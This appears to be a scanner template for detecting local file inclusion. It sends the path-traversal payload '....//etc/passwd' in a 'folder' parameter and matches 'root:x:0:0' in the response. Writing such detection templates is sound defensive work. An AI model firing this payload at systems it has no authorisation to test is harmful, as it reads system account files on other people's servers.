id: lfi7-338
name: 'Deep traversal in folder'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via folder'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      folder:
        - '....//etc/passwd'
    matchers:
      - type: word
        part: body
        words:
          - 'root:x:0:0'
